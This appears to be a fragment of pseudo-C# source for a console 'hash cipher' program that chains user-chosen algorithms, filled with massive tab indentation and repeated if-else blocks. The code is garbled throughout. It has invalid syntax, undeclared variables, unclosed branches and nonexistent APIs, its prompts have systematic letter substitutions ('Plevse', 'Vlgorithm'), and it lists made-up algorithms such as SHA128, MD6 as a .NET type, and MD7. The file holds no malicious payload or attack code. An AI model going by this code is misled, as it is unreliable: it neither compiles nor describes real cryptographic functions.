																																																																																																																																																																																System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																																																string _inputDecision2 = System.Console.ReadLine();
																																																																																																																																																																																System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Three of The Hvshing Function: ");
																																																																																																																																																																																System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																																																string _inputDecision3 = System.Console.ReadLine();
																																																																																																																																																																																System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Four of The Hvshing Function: ");
																																																																																																																																																																																System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																																																string _inputDecision4 = System.Console.ReadLine();
																																																																																																																																																																																System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Five of The Hvshing Function: ");
																																																																																																																																																																																System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																																																string _inputDecision5 = System.Console.ReadLine();
																																																																																																																																																																																System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Six of The Hvshing Function: ");
																																																																																																																																																																																System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");


																																																																																																																																																																																string _inputDecision9 = System.Console.ReadLine();

																																																																																																																																																																																public array[:] _diarrayEya = new array["SHV128" : "11" , "SHV256" : "12" , "SHV512" : "13" , "MD5" : "14" , "MD6" : "15" , "MD7" : "16"];

																																																																																																																																																																																public int _int1 = _commCrypto.IndexOf("SHA128");
																																																																																																																																																																																public int _int2 = _commCrypto.IndexOf("SHA256");
																																																																																																																																																																																public int _int3 = _commCrypto.IndexOf("SHA512");
																																																																																																																																																																																public int _int4 = _commCrypto.IndexOf("MD5");
																																																																																																																																																																																public int _int5 = _commCrypto.IndexOf("MD6");
																																																																																																																																																																																public int _int6 = _commCrypto.IndexOf("MD7");
																																																																																																																																																																																public string _codexstring = "";
																																																																																																																																																																																if(_inputDecision == _int1 || _inputDecision2 == _int1 || _inputDecision3 == _int1 || _inputDecision4 == _int1 || _inputDecision5 == _int1 || _inputDecision6 == _int1 || _inputDecision7 == _int1 || _inputDecision8 == _int1 ||
																																																																																																																																																																																	_inputDecision9 == _int1){

																																																																																																																																																																																																																																																												string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																																																	string _part1 = _disarrayEya[0];
																																																																																																																																																																																	public bool _boolIT = new bool(,);
																																																																																																																																																																																	if(_boolIT(_inputDecision  , _int1) == true){

																																																																																																																																																																																		_disArray.Ammend[string "c" : 0];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision2, _int1) == true){

																																																																																																																																																																																		_disArray.Ammend[string "c" : 1];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision3 , _int1) == true){


																																																																																																																																																																																		_disArray.Ammend[string "c" : 2];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision4 , _int1) == true){

																																																																																																																																																																																		_disArray.Ammend[string "c" : 3];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision5 , _int1) == true){

																																																																																																																																																																																		_disArray.Ammend[string "c" : 4];
																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision6 , _int1) == true){

																																																																																																																																																																																		_disArray.Ammend[string "c" : 5];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision7 , _int1) == true){

																																																																																																																																																																																		_disArray.Ammend[string "c" : 6];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision8 , _int1) == true){

																																																																																																																																																																																		_disArray.Ammend[string "c" : 7];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision9 , _int1) == true){

																																																																																																																																																																																		_disArray.Ammend[string "c" : 8];

																																																																																																																																																																																	}
																																																																																																																																																																																	else{

																																																																																																																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																	}


																																																																																																																																																																																}
																																																																																																																																																																																else if(_inputDecision == _int2 || _inputDecision2 == _int2 || _inputDecision3 == _int2 || _inputDecision4 == _int2 || _inputDecision5 == _int2 || _inputDecision6 == _int2 || _inputDecision7 == _int2 || _inputDecision8 == _int2 ||
																																																																																																																																																																																	_inputDecision9 == _int2){

																																																																																																																																																																																	string _part1 = _disarrayEya[0];
																																																																																																																																																																																																																																																												string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																																																	public bool _boolIT = new bool(,);
																																																																																																																																																																																	if(_boolIT(_inputDecision  , _int2) == true){

																																																																																																																																																																																		_disArray.Ammend[string "d" : 0];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision2, _int2) == true){

																																																																																																																																																																																		_disArray.Ammend[string "d" : 1];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision3 , _int2) == true){

																																																																																																																																																																																		_disArray.Ammend[string "d" : 2];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision4 , _int2) == true){

																																																																																																																																																																																		_disArray.Ammend[string "d" : 3];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision5 , _int2) == true){

																																																																																																																																																																																		_disArray.Ammend[string "d" : 4];
																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision6 , _int2) == true){

																																																																																																																																																																																		_disArray.Ammend[string "d" : 5];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision7 , _int2) == true){

																																																																																																																																																																																		_disArray.Ammend[string "d" : 6];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision8 , _int2) == true){

																																																																																																																																																																																		_disArray.Ammend[string "d" : 7];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision9 , _int2) == true){

																																																																																																																																																																																		_disArray.Ammend[string "d" : 8];

																																																																																																																																																																																	}
																																																																																																																																																																																	else{

																																																																																																																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																	}


																																																																																																																																																																																}
																																																																																																																																																																																else if(_inputDecision == _int3 || _inputDecision2 == _int3 || _inputDecision3 == _int3 || _inputDecision4 == _int3 || _inputDecision5 == _int3 || _inputDecision6 == _int3 || _inputDecision7 == _int3 || _inputDecision8 == _int3 ||
																																																																																																																																																																																	_inputDecision9 == _int3){

																																																																																																																																																																																																																																																												string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																																																	string _part1 = _disarrayEya[0];
																																																																																																																																																																																	public bool _boolIT = new bool(,);
																																																																																																																																																																																	if(_boolIT(_inputDecision  , _int3) == true){

																																																																																																																																																																																		_disArray.Ammend[string "e" : 0];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision2, _int3) == true){


																																																																																																																																																																																		_disArray.Ammend[string "e" : 1];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision3 , _int3) == true){

																																																																																																																																																																																		_disArray.Ammend[string "e" : 2];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision4 , _int3) == true){

																																																																																																																																																																																		_disArray.Ammend[string "e" : 3];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision5 , _int3) == true){

																																																																																																																																																																																		_disArray.Ammend[string "e" : 4];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision6 , _int3) == true){

																																																																																																																																																																																		_disArray.Ammend[string "e" : 5];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision7 , _int3) == true){

																																																																																																																																																																																		_disArray.Ammend[string "e" : 6];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision8 , _int3) == true){

																																																																																																																																																																																		_disArray.Ammend[string "e" : 7];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision9 , _int3) == true){

																																																																																																																																																																																		_disArray.Ammend[string "e" : 8];

																																																																																																																																																																																	}
																																																																																																																																																																																	else{

																																																																																																																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																	}

																																																																																																																																																																																}
																																																																																																																																																																																else if(_inputDecision == _int4 || _inputDecision2 == _int4 || _inputDecision3 == _int4 || _inputDecision4 == _int4 || _inputDecision5 == _int4 || _inputDecision6 == _int4 || _inputDecision7 == _int4 || _inputDecision8 == _int4 ||
																																																																																																																																																																																	_inputDecision9 == _int4){

																																																																																																																																																																																																																																																												string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];

																																																																																																																																																																																	string _part1 = _disarrayEya[0];
																																																																																																																																																																																	public bool _boolIT = new bool(,);
																																																																																																																																																																																	if(_boolIT(_inputDecision  , _int4) == true){

																																																																																																																																																																																		_disArray.Ammend[string "f" : 0];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision2, _int4) == true){


																																																																																																																																																																																		_disArray.Ammend[string "f" : 1];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision3 , _int4) == true){

																																																																																																																																																																																		_disArray.Ammend[string "f" : 2];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision4 , _int4) == true){

																																																																																																																																																																																		_disArray.Ammend[string "f" : 3];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision5 , _int4) == true){

																																																																																																																																																																																		_disArray.Ammend[string "f" : 4];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision6 , _int4) == true){

																																																																																																																																																																																		_disArray.Ammend[string "f" : 5];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision7 , _int4) == true){

																																																																																																																																																																																		_disArray.Ammend[string "f" : 6];
																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision8 , _int4) == true){

																																																																																																																																																																																		_disArray.Ammend[string "f" : 7];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision9 , _int4) == true){

																																																																																																																																																																																		_disArray.Ammend[string "f" : 8];

																																																																																																																																																																																	}
																																																																																																																																																																																	else{

																																																																																																																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");



																																																																																																																																																																																	}

																																																																																																																																																																																}
																																																																																																																																																																																else if(_inputDecision == _int5 || _inputDecision2 == _int5 || _inputDecision3 == _int5 || _inputDecision4 == _int5 || _inputDecision5 == _int5 || _inputDecision6 == _int5 || _inputDecision7 == _int5 || _inputDecision8 == _int5 ||
																																																																																																																																																																																	_inputDecision9 == _int5){


																																																																																																																																																																																																																																																												string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																																																	string _part1 = _disarrayEya[0];
																																																																																																																																																																																	public bool _boolIT = new bool(,);
																																																																																																																																																																																	if(_boolIT(_inputDecision  , _int5) == true){

																																																																																																																																																																																		_disArray.Ammend[string "G" : 0];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision2, _int5) == true){

																																																																																																																																																																																		_disArray.Ammend[string "G" : 1];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision3 , _int5) == true){

																																																																																																																																																																																		_disArray.Ammend[string "G" : 2];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision4 , _int5) == true){

																																																																																																																																																																																		_disArray.Ammend[string "G" : 3];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision5 , _int5) == true){

																																																																																																																																																																																		_disArray.Ammend[string "G" : 4];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision6 , _int5) == true){

																																																																																																																																																																																		_disArray.Ammend[string "G" : 5];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision7 , _int5) == true){

																																																																																																																																																																																		_disArray.Ammend[string "G" : 6];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision8 , _int5) == true){

																																																																																																																																																																																		_disArray.Ammend[string "G" : 7];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision9 , _int5) == true){

																																																																																																																																																																																		_disArray.Ammend[string "G" : 8];

																																																																																																																																																																																	}
																																																																																																																																																																																	else{
																																																																																																																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");



																																																																																																																																																																																	}

																																																																																																																																																																																}
																																																																																																																																																																																else if(_inputDecision == _int6 || _inputDecision2 == _int6 || _inputDecision3 == _int6 || _inputDecision4 == _int6 || _inputDecision5 == _int6 || _inputDecision6 == _int6 || _inputDecision7 == _int6 || _inputDecision8 == _int6 ||
																																																																																																																																																																																	_inputDecision9 == _int6){


																																																																																																																																																																																																																																																												string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																																																	string _part1 = _disarrayEya[0];
																																																																																																																																																																																	public bool _boolIT = new bool(,);
																																																																																																																																																																																	if(_boolIT(_inputDecision  , _int6) == true){

																																																																																																																																																																																		_disArray.Ammend[string "z" : 0];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision2, _int6) == true){

																																																																																																																																																																																		_disArray.Ammend[string "z" : 1];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision3 , _int6) == true){

																																																																																																																																																																																		_disArray.Ammend[string "z" : 2];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision4 , _int6) == true){


																																																																																																																																																																																		_disArray.Ammend[string "z" : 3];



																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision5 , _int6) == true){



																																																																																																																																																																																		_disArray.Ammend[string "z" : 4];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision6 , _int6) == true){

																																																																																																																																																																																		_disArray.Ammend[string "z" : 5];


																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision7 , _int6) == true){

																																																																																																																																																																																		_disArray.Ammend[string "z" : 6];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision8 , _int6) == true){

																																																																																																																																																																																		_disArray.Ammend[string "z" : 7];

																																																																																																																																																																																	}
																																																																																																																																																																																	else if(_boolIT(_inputDecision9 , _int6) == true){

																																																																																																																																																																																		_disArray.Ammend[string "z" : 8];

																																																																																																																																																																																	}
																																																																																																																																																																																	else{
																																																																																																																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");



																																																																																																																																																																																	}

																																																																																																																																																																																}
																																																																																																																																																																																else{

																																																																																																																																																																																	System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																}


																																																																																																																																																																																System.Console.WriteLine("Plvse Input The Text You Wish To Hvve Encoded In Your 8-1 Dimensionvl Vlgorithmic Hvsh Cipher: ");
																																																																																																																																																																																string _CipherPreText = System.Console.ReadLine();

																																																																																																																																																																																for(_codexstring[0]){

																																																																																																																																																																																	if(_codexstring[0] == "c"){
																																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																			public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																			public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																			return _shvfunc;

																																																																																																																																																																																		}

																																																																																																																																																																																	}

																																																																																																																																																																																	else if(_codexstring[0] == "d"){
																																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																			public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																			public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																			return _shvfunc;

																																																																																																																																																																																		}
																																																																																																																																																																																		else if(_codexstring[0] == "e"){
																																																																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																				public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																				public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																				return _shvfunc;

																																																																																																																																																																																			}
																																																																																																																																																																																			else if(_codexstring[0] == "f"){
																																																																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																					public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																					public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																					return _shvfunc;

																																																																																																																																																																																				}
																																																																																																																																																																																				else if(_codexstring[0] == "G"){
																																																																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																						public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																						public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																						return _shvfunc;

																																																																																																																																																																																					}
																																																																																																																																																																																					else if(_codexstring[0] == "z"){
																																																																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																							public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																							public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																							return _shvfunc;

																																																																																																																																																																																						}
																																																																																																																																																																																						else{

																																																																																																																																																																																							System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																						}



																																																																																																																																																																																					}
																																																																																																																																																																																					for(_codexstring[1]){

																																																																																																																																																																																						if(_codexstring[1] == "c"){
																																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																								public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																								public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																								return _shvfunc;

																																																																																																																																																																																							}

																																																																																																																																																																																						}

																																																																																																																																																																																						else if(_codexstring[1] == "d"){
																																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																								public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																								public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																								return _shvfunc;

																																																																																																																																																																																							}
																																																																																																																																																																																							else if(_codexstring[1] == "e"){
																																																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																									public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																									public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																									return _shvfunc;

																																																																																																																																																																																								}
																																																																																																																																																																																								else if(_codexstring[1] == "f"){
																																																																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																										public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																										public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																										return _shvfunc;

																																																																																																																																																																																									}
																																																																																																																																																																																									else if(_codexstring[1] == "G"){
																																																																																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																											public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																											public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																											return _shvfunc;

																																																																																																																																																																																										}
																																																																																																																																																																																										else if(_codexstring[1] == "z"){
																																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																												public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																												public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																												return _shvfunc;

																																																																																																																																																																																											}
																																																																																																																																																																																											else{

																																																																																																																																																																																												System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																											}



																																																																																																																																																																																										}
																																																																																																																																																																																										for(_codexstring[2]){

																																																																																																																																																																																											if(_codexstring[2] == "c"){
																																																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																													public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																													public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																													return _shvfunc;

																																																																																																																																																																																												}

																																																																																																																																																																																											}

																																																																																																																																																																																											else if(_codexstring[2] == "d"){
																																																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																													public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																													public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																													return _shvfunc;

																																																																																																																																																																																												}
																																																																																																																																																																																												else if(_codexstring[2] == "e"){
																																																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																														public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																														public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																														return _shvfunc;

																																																																																																																																																																																													}
																																																																																																																																																																																													else if(_codexstring[2] == "f"){
																																																																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																															public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																															public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																															return _shvfunc;

																																																																																																																																																																																														}
																																																																																																																																																																																														else if(_codexstring[2] == "G"){
																																																																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																return _shvfunc;

																																																																																																																																																																																															}
																																																																																																																																																																																															else if(_codexstring[2] == "z"){
																																																																																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																	public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																	public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																	return _shvfunc;

																																																																																																																																																																																																}
																																																																																																																																																																																																else{

																																																																																																																																																																																																	System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																}
																																																																																																																																																																																															}
																																																																																																																																																																																															for(_codexstring[3]){

																																																																																																																																																																																																if(_codexstring[3] == "c"){
																																																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																		public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																																		public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																																		return _shvfunc;

																																																																																																																																																																																																	}

																																																																																																																																																																																																}

																																																																																																																																																																																																else if(_codexstring[3] == "d"){
																																																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																		public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																																		public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																																		return _shvfunc;

																																																																																																																																																																																																	}
